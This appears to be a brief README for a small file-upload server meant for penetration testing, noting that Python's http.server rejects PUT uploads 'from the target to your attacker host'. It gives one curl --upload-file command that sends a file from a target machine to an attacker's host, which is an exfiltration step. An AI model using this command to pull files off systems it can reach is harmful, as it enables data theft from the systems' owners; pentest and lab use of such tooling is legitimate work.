Python modules http.server and uploadserver appear not working when attemp to upload a file from the target to your attacker host. It returns an error that PUT method is not supported.
So this script will help, just run it and try to upload a file.
Linux: curl --upload-file <filename> http://<ip>:8000/
